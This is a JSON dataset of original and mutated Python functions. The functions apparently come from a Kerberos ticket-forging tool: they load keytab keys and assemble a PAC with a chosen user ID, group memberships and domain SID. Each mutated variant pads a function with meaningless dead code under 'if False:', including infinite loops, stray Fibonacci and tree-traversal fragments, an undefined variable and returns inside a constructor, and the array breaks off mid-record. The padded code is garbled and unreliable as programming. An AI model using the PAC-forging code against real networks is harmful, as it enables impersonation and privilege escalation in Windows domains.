[
    {
        "func_name": "__init__",
        "original": "def __init__(self, target, password, domain, options):\n    self.__password = password\n    self.__target = target\n    self.__domain = domain\n    self.__options = options\n    self.__tgt = None\n    self.__tgt_session_key = None\n    if options.spn:\n        spn = options.spn.split('/')\n        self.__service = spn[0]\n        self.__server = spn[1]\n        if options.keytab is not None:\n            self.loadKeysFromKeytab(options.keytab)\n    else:\n        self.__service = 'krbtgt'\n        self.__server = self.__domain",
        "mutated": [
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n    self.__password = password\n    self.__target = target\n    self.__domain = domain\n    self.__options = options\n    self.__tgt = None\n    self.__tgt_session_key = None\n    if options.spn:\n        spn = options.spn.split('/')\n        self.__service = spn[0]\n        self.__server = spn[1]\n        if options.keytab is not None:\n            self.loadKeysFromKeytab(options.keytab)\n    else:\n        self.__service = 'krbtgt'\n        self.__server = self.__domain",
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.__password = password\n    self.__target = target\n    self.__domain = domain\n    self.__options = options\n    self.__tgt = None\n    self.__tgt_session_key = None\n    if options.spn:\n        spn = options.spn.split('/')\n        self.__service = spn[0]\n        self.__server = spn[1]\n        if options.keytab is not None:\n            self.loadKeysFromKeytab(options.keytab)\n    else:\n        self.__service = 'krbtgt'\n        self.__server = self.__domain",
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.__password = password\n    self.__target = target\n    self.__domain = domain\n    self.__options = options\n    self.__tgt = None\n    self.__tgt_session_key = None\n    if options.spn:\n        spn = options.spn.split('/')\n        self.__service = spn[0]\n        self.__server = spn[1]\n        if options.keytab is not None:\n            self.loadKeysFromKeytab(options.keytab)\n    else:\n        self.__service = 'krbtgt'\n        self.__server = self.__domain",
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.__password = password\n    self.__target = target\n    self.__domain = domain\n    self.__options = options\n    self.__tgt = None\n    self.__tgt_session_key = None\n    if options.spn:\n        spn = options.spn.split('/')\n        self.__service = spn[0]\n        self.__server = spn[1]\n        if options.keytab is not None:\n            self.loadKeysFromKeytab(options.keytab)\n    else:\n        self.__service = 'krbtgt'\n        self.__server = self.__domain",
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.__password = password\n    self.__target = target\n    self.__domain = domain\n    self.__options = options\n    self.__tgt = None\n    self.__tgt_session_key = None\n    if options.spn:\n        spn = options.spn.split('/')\n        self.__service = spn[0]\n        self.__server = spn[1]\n        if options.keytab is not None:\n            self.loadKeysFromKeytab(options.keytab)\n    else:\n        self.__service = 'krbtgt'\n        self.__server = self.__domain"
        ]
    },
    {
        "func_name": "getFileTime",
        "original": "@staticmethod\ndef getFileTime(t):\n    t *= 10000000\n    t += 116444736000000000\n    return t",
        "mutated": [
            "@staticmethod\ndef getFileTime(t):\n    if False:\n        i = 10\n    t *= 10000000\n    t += 116444736000000000\n    return t",
            "@staticmethod\ndef getFileTime(t):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    t *= 10000000\n    t += 116444736000000000\n    return t",
            "@staticmethod\ndef getFileTime(t):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    t *= 10000000\n    t += 116444736000000000\n    return t",
            "@staticmethod\ndef getFileTime(t):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    t *= 10000000\n    t += 116444736000000000\n    return t",
            "@staticmethod\ndef getFileTime(t):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    t *= 10000000\n    t += 116444736000000000\n    return t"
        ]
    },
    {
        "func_name": "getPadLength",
        "original": "@staticmethod\ndef getPadLength(data_length):\n    return (data_length + 7) // 8 * 8 - data_length",
        "mutated": [
            "@staticmethod\ndef getPadLength(data_length):\n    if False:\n        i = 10\n    return (data_length + 7) // 8 * 8 - data_length",
            "@staticmethod\ndef getPadLength(data_length):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    return (data_length + 7) // 8 * 8 - data_length",
            "@staticmethod\ndef getPadLength(data_length):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    return (data_length + 7) // 8 * 8 - data_length",
            "@staticmethod\ndef getPadLength(data_length):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    return (data_length + 7) // 8 * 8 - data_length",
            "@staticmethod\ndef getPadLength(data_length):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    return (data_length + 7) // 8 * 8 - data_length"
        ]
    },
    {
        "func_name": "getBlockLength",
        "original": "@staticmethod\ndef getBlockLength(data_length):\n    return (data_length + 7) // 8 * 8",
        "mutated": [
            "@staticmethod\ndef getBlockLength(data_length):\n    if False:\n        i = 10\n    return (data_length + 7) // 8 * 8",
            "@staticmethod\ndef getBlockLength(data_length):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    return (data_length + 7) // 8 * 8",
            "@staticmethod\ndef getBlockLength(data_length):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    return (data_length + 7) // 8 * 8",
            "@staticmethod\ndef getBlockLength(data_length):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    return (data_length + 7) // 8 * 8",
            "@staticmethod\ndef getBlockLength(data_length):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    return (data_length + 7) // 8 * 8"
        ]
    },
    {
        "func_name": "loadKeysFromKeytab",
        "original": "def loadKeysFromKeytab(self, filename):\n    keytab = Keytab.loadFile(filename)\n    keyblock = keytab.getKey('%s@%s' % (options.spn, self.__domain))\n    if keyblock:\n        if keyblock['keytype'] == Enctype.AES256 or keyblock['keytype'] == Enctype.AES128:\n            options.aesKey = keyblock.hexlifiedValue()\n        elif keyblock['keytype'] == Enctype.RC4:\n            options.nthash = keyblock.hexlifiedValue()\n    else:\n        logging.warning(\"No matching key for SPN '%s' in given keytab found!\", options.spn)",
        "mutated": [
            "def loadKeysFromKeytab(self, filename):\n    if False:\n        i = 10\n    keytab = Keytab.loadFile(filename)\n    keyblock = keytab.getKey('%s@%s' % (options.spn, self.__domain))\n    if keyblock:\n        if keyblock['keytype'] == Enctype.AES256 or keyblock['keytype'] == Enctype.AES128:\n            options.aesKey = keyblock.hexlifiedValue()\n        elif keyblock['keytype'] == Enctype.RC4:\n            options.nthash = keyblock.hexlifiedValue()\n    else:\n        logging.warning(\"No matching key for SPN '%s' in given keytab found!\", options.spn)",
            "def loadKeysFromKeytab(self, filename):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    keytab = Keytab.loadFile(filename)\n    keyblock = keytab.getKey('%s@%s' % (options.spn, self.__domain))\n    if keyblock:\n        if keyblock['keytype'] == Enctype.AES256 or keyblock['keytype'] == Enctype.AES128:\n            options.aesKey = keyblock.hexlifiedValue()\n        elif keyblock['keytype'] == Enctype.RC4:\n            options.nthash = keyblock.hexlifiedValue()\n    else:\n        logging.warning(\"No matching key for SPN '%s' in given keytab found!\", options.spn)",
            "def loadKeysFromKeytab(self, filename):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    keytab = Keytab.loadFile(filename)\n    keyblock = keytab.getKey('%s@%s' % (options.spn, self.__domain))\n    if keyblock:\n        if keyblock['keytype'] == Enctype.AES256 or keyblock['keytype'] == Enctype.AES128:\n            options.aesKey = keyblock.hexlifiedValue()\n        elif keyblock['keytype'] == Enctype.RC4:\n            options.nthash = keyblock.hexlifiedValue()\n    else:\n        logging.warning(\"No matching key for SPN '%s' in given keytab found!\", options.spn)",
            "def loadKeysFromKeytab(self, filename):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    keytab = Keytab.loadFile(filename)\n    keyblock = keytab.getKey('%s@%s' % (options.spn, self.__domain))\n    if keyblock:\n        if keyblock['keytype'] == Enctype.AES256 or keyblock['keytype'] == Enctype.AES128:\n            options.aesKey = keyblock.hexlifiedValue()\n        elif keyblock['keytype'] == Enctype.RC4:\n            options.nthash = keyblock.hexlifiedValue()\n    else:\n        logging.warning(\"No matching key for SPN '%s' in given keytab found!\", options.spn)",
            "def loadKeysFromKeytab(self, filename):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    keytab = Keytab.loadFile(filename)\n    keyblock = keytab.getKey('%s@%s' % (options.spn, self.__domain))\n    if keyblock:\n        if keyblock['keytype'] == Enctype.AES256 or keyblock['keytype'] == Enctype.AES128:\n            options.aesKey = keyblock.hexlifiedValue()\n        elif keyblock['keytype'] == Enctype.RC4:\n            options.nthash = keyblock.hexlifiedValue()\n    else:\n        logging.warning(\"No matching key for SPN '%s' in given keytab found!\", options.spn)"
        ]
    },
    {
        "func_name": "createBasicValidationInfo",
        "original": "def createBasicValidationInfo(self):\n    kerbdata = KERB_VALIDATION_INFO()\n    aTime = timegm(datetime.datetime.utcnow().timetuple())\n    unixTime = self.getFileTime(aTime)\n    kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['LogoffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['LogoffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['KickOffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['KickOffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['PasswordCanChange']['dwLowDateTime'] = 0\n    kerbdata['PasswordCanChange']['dwHighDateTime'] = 0\n    kerbdata['PasswordMustChange']['dwLowDateTime'] = 4294967295\n    kerbdata['PasswordMustChange']['dwHighDateTime'] = 2147483647\n    kerbdata['EffectiveName'] = self.__target\n    kerbdata['FullName'] = ''\n    kerbdata['LogonScript'] = ''\n    kerbdata['ProfilePath'] = ''\n    kerbdata['HomeDirectory'] = ''\n    kerbdata['HomeDirectoryDrive'] = ''\n    kerbdata['LogonCount'] = 500\n    kerbdata['BadPasswordCount'] = 0\n    kerbdata['UserId'] = int(self.__options.user_id)\n    groups = self.__options.groups.split(',')\n    if len(groups) == 0:\n        kerbdata['PrimaryGroupId'] = 513\n    else:\n        kerbdata['PrimaryGroupId'] = int(groups[0])\n    kerbdata['GroupCount'] = len(groups)\n    for group in groups:\n        groupMembership = GROUP_MEMBERSHIP()\n        groupId = NDRULONG()\n        groupId['Data'] = int(group)\n        groupMembership['RelativeId'] = groupId\n        groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n        kerbdata['GroupIds'].append(groupMembership)\n    kerbdata['UserFlags'] = 0\n    kerbdata['UserSessionKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['LogonServer'] = ''\n    kerbdata['LogonDomainName'] = self.__domain.upper()\n    kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)\n    kerbdata['LMKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD\n    kerbdata['SubAuthStatus'] = 0\n    kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0\n    kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwLowDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwHighDateTime'] = 0\n    kerbdata['FailedILogonCount'] = 0\n    kerbdata['Reserved3'] = 0\n    kerbdata['ResourceGroupDomainSid'] = NULL\n    kerbdata['ResourceGroupCount'] = 0\n    kerbdata['ResourceGroupIds'] = NULL\n    validationInfo = VALIDATION_INFO()\n    validationInfo['Data'] = kerbdata\n    return validationInfo",
        "mutated": [
            "def createBasicValidationInfo(self):\n    if False:\n        i = 10\n    kerbdata = KERB_VALIDATION_INFO()\n    aTime = timegm(datetime.datetime.utcnow().timetuple())\n    unixTime = self.getFileTime(aTime)\n    kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['LogoffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['LogoffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['KickOffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['KickOffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['PasswordCanChange']['dwLowDateTime'] = 0\n    kerbdata['PasswordCanChange']['dwHighDateTime'] = 0\n    kerbdata['PasswordMustChange']['dwLowDateTime'] = 4294967295\n    kerbdata['PasswordMustChange']['dwHighDateTime'] = 2147483647\n    kerbdata['EffectiveName'] = self.__target\n    kerbdata['FullName'] = ''\n    kerbdata['LogonScript'] = ''\n    kerbdata['ProfilePath'] = ''\n    kerbdata['HomeDirectory'] = ''\n    kerbdata['HomeDirectoryDrive'] = ''\n    kerbdata['LogonCount'] = 500\n    kerbdata['BadPasswordCount'] = 0\n    kerbdata['UserId'] = int(self.__options.user_id)\n    groups = self.__options.groups.split(',')\n    if len(groups) == 0:\n        kerbdata['PrimaryGroupId'] = 513\n    else:\n        kerbdata['PrimaryGroupId'] = int(groups[0])\n    kerbdata['GroupCount'] = len(groups)\n    for group in groups:\n        groupMembership = GROUP_MEMBERSHIP()\n        groupId = NDRULONG()\n        groupId['Data'] = int(group)\n        groupMembership['RelativeId'] = groupId\n        groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n        kerbdata['GroupIds'].append(groupMembership)\n    kerbdata['UserFlags'] = 0\n    kerbdata['UserSessionKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['LogonServer'] = ''\n    kerbdata['LogonDomainName'] = self.__domain.upper()\n    kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)\n    kerbdata['LMKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD\n    kerbdata['SubAuthStatus'] = 0\n    kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0\n    kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwLowDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwHighDateTime'] = 0\n    kerbdata['FailedILogonCount'] = 0\n    kerbdata['Reserved3'] = 0\n    kerbdata['ResourceGroupDomainSid'] = NULL\n    kerbdata['ResourceGroupCount'] = 0\n    kerbdata['ResourceGroupIds'] = NULL\n    validationInfo = VALIDATION_INFO()\n    validationInfo['Data'] = kerbdata\n    return validationInfo",
            "def createBasicValidationInfo(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    kerbdata = KERB_VALIDATION_INFO()\n    aTime = timegm(datetime.datetime.utcnow().timetuple())\n    unixTime = self.getFileTime(aTime)\n    kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['LogoffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['LogoffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['KickOffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['KickOffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['PasswordCanChange']['dwLowDateTime'] = 0\n    kerbdata['PasswordCanChange']['dwHighDateTime'] = 0\n    kerbdata['PasswordMustChange']['dwLowDateTime'] = 4294967295\n    kerbdata['PasswordMustChange']['dwHighDateTime'] = 2147483647\n    kerbdata['EffectiveName'] = self.__target\n    kerbdata['FullName'] = ''\n    kerbdata['LogonScript'] = ''\n    kerbdata['ProfilePath'] = ''\n    kerbdata['HomeDirectory'] = ''\n    kerbdata['HomeDirectoryDrive'] = ''\n    kerbdata['LogonCount'] = 500\n    kerbdata['BadPasswordCount'] = 0\n    kerbdata['UserId'] = int(self.__options.user_id)\n    groups = self.__options.groups.split(',')\n    if len(groups) == 0:\n        kerbdata['PrimaryGroupId'] = 513\n    else:\n        kerbdata['PrimaryGroupId'] = int(groups[0])\n    kerbdata['GroupCount'] = len(groups)\n    for group in groups:\n        groupMembership = GROUP_MEMBERSHIP()\n        groupId = NDRULONG()\n        groupId['Data'] = int(group)\n        groupMembership['RelativeId'] = groupId\n        groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n        kerbdata['GroupIds'].append(groupMembership)\n    kerbdata['UserFlags'] = 0\n    kerbdata['UserSessionKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['LogonServer'] = ''\n    kerbdata['LogonDomainName'] = self.__domain.upper()\n    kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)\n    kerbdata['LMKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD\n    kerbdata['SubAuthStatus'] = 0\n    kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0\n    kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwLowDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwHighDateTime'] = 0\n    kerbdata['FailedILogonCount'] = 0\n    kerbdata['Reserved3'] = 0\n    kerbdata['ResourceGroupDomainSid'] = NULL\n    kerbdata['ResourceGroupCount'] = 0\n    kerbdata['ResourceGroupIds'] = NULL\n    validationInfo = VALIDATION_INFO()\n    validationInfo['Data'] = kerbdata\n    return validationInfo",
            "def createBasicValidationInfo(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    kerbdata = KERB_VALIDATION_INFO()\n    aTime = timegm(datetime.datetime.utcnow().timetuple())\n    unixTime = self.getFileTime(aTime)\n    kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['LogoffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['LogoffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['KickOffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['KickOffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['PasswordCanChange']['dwLowDateTime'] = 0\n    kerbdata['PasswordCanChange']['dwHighDateTime'] = 0\n    kerbdata['PasswordMustChange']['dwLowDateTime'] = 4294967295\n    kerbdata['PasswordMustChange']['dwHighDateTime'] = 2147483647\n    kerbdata['EffectiveName'] = self.__target\n    kerbdata['FullName'] = ''\n    kerbdata['LogonScript'] = ''\n    kerbdata['ProfilePath'] = ''\n    kerbdata['HomeDirectory'] = ''\n    kerbdata['HomeDirectoryDrive'] = ''\n    kerbdata['LogonCount'] = 500\n    kerbdata['BadPasswordCount'] = 0\n    kerbdata['UserId'] = int(self.__options.user_id)\n    groups = self.__options.groups.split(',')\n    if len(groups) == 0:\n        kerbdata['PrimaryGroupId'] = 513\n    else:\n        kerbdata['PrimaryGroupId'] = int(groups[0])\n    kerbdata['GroupCount'] = len(groups)\n    for group in groups:\n        groupMembership = GROUP_MEMBERSHIP()\n        groupId = NDRULONG()\n        groupId['Data'] = int(group)\n        groupMembership['RelativeId'] = groupId\n        groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n        kerbdata['GroupIds'].append(groupMembership)\n    kerbdata['UserFlags'] = 0\n    kerbdata['UserSessionKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['LogonServer'] = ''\n    kerbdata['LogonDomainName'] = self.__domain.upper()\n    kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)\n    kerbdata['LMKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD\n    kerbdata['SubAuthStatus'] = 0\n    kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0\n    kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwLowDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwHighDateTime'] = 0\n    kerbdata['FailedILogonCount'] = 0\n    kerbdata['Reserved3'] = 0\n    kerbdata['ResourceGroupDomainSid'] = NULL\n    kerbdata['ResourceGroupCount'] = 0\n    kerbdata['ResourceGroupIds'] = NULL\n    validationInfo = VALIDATION_INFO()\n    validationInfo['Data'] = kerbdata\n    return validationInfo",
            "def createBasicValidationInfo(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    kerbdata = KERB_VALIDATION_INFO()\n    aTime = timegm(datetime.datetime.utcnow().timetuple())\n    unixTime = self.getFileTime(aTime)\n    kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['LogoffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['LogoffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['KickOffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['KickOffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['PasswordCanChange']['dwLowDateTime'] = 0\n    kerbdata['PasswordCanChange']['dwHighDateTime'] = 0\n    kerbdata['PasswordMustChange']['dwLowDateTime'] = 4294967295\n    kerbdata['PasswordMustChange']['dwHighDateTime'] = 2147483647\n    kerbdata['EffectiveName'] = self.__target\n    kerbdata['FullName'] = ''\n    kerbdata['LogonScript'] = ''\n    kerbdata['ProfilePath'] = ''\n    kerbdata['HomeDirectory'] = ''\n    kerbdata['HomeDirectoryDrive'] = ''\n    kerbdata['LogonCount'] = 500\n    kerbdata['BadPasswordCount'] = 0\n    kerbdata['UserId'] = int(self.__options.user_id)\n    groups = self.__options.groups.split(',')\n    if len(groups) == 0:\n        kerbdata['PrimaryGroupId'] = 513\n    else:\n        kerbdata['PrimaryGroupId'] = int(groups[0])\n    kerbdata['GroupCount'] = len(groups)\n    for group in groups:\n        groupMembership = GROUP_MEMBERSHIP()\n        groupId = NDRULONG()\n        groupId['Data'] = int(group)\n        groupMembership['RelativeId'] = groupId\n        groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n        kerbdata['GroupIds'].append(groupMembership)\n    kerbdata['UserFlags'] = 0\n    kerbdata['UserSessionKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['LogonServer'] = ''\n    kerbdata['LogonDomainName'] = self.__domain.upper()\n    kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)\n    kerbdata['LMKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD\n    kerbdata['SubAuthStatus'] = 0\n    kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0\n    kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwLowDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwHighDateTime'] = 0\n    kerbdata['FailedILogonCount'] = 0\n    kerbdata['Reserved3'] = 0\n    kerbdata['ResourceGroupDomainSid'] = NULL\n    kerbdata['ResourceGroupCount'] = 0\n    kerbdata['ResourceGroupIds'] = NULL\n    validationInfo = VALIDATION_INFO()\n    validationInfo['Data'] = kerbdata\n    return validationInfo",
